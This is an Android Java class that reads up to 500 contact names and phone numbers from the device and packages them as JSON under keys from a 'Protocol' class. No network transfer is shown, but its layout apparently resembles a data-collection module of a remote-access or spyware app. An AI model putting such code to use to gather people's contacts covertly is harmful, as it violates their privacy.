package com.fason.app.features.contacts;

import android.Manifest;
import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

public final class ContactsManager {

    private static final int MAX = 500;

    private ContactsManager() {}

    public static JSONObject getContacts() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            result.put(Protocol.KEY_CONTACTS_LIST, list);

            if (!PermissionManager.canIUse(Manifest.permission.READ_CONTACTS)) {
                result.put(Protocol.KEY_ERROR, "Permission denied");
                return result;
            }

            Cursor cur = FasonApp.getContext().getContentResolver().query(
                Phone.CONTENT_URI,
                new String[]{Phone.DISPLAY_NAME, Phone.NUMBER},
                null, null,
                Phone.DISPLAY_NAME + " ASC");

            if (cur != null) {
                try {
                    int nameIdx = cur.getColumnIndex(Phone.DISPLAY_NAME);
                    int numIdx = cur.getColumnIndex(Phone.NUMBER);
                    int count = 0;

                    while (cur.moveToNext() && count < MAX) {
                        String name = nameIdx >= 0 ? cur.getString(nameIdx) : "";
                        String phoneNo = numIdx >= 0 ? cur.getString(numIdx) : "";

                        if (name.isEmpty() && phoneNo.isEmpty()) continue;

                        JSONObject c = new JSONObject();
                        c.put(Protocol.KEY_NAME, name);
                        c.put(Protocol.KEY_PHONE_NO, phoneNo);
                        list.put(c);
                        count++;
                    }
                } finally {
                    cur.close();
                }
            }
            result.put(Protocol.KEY_TOTAL, list.length());
        } catch (Exception ignored) {}

        return result;
    }
}
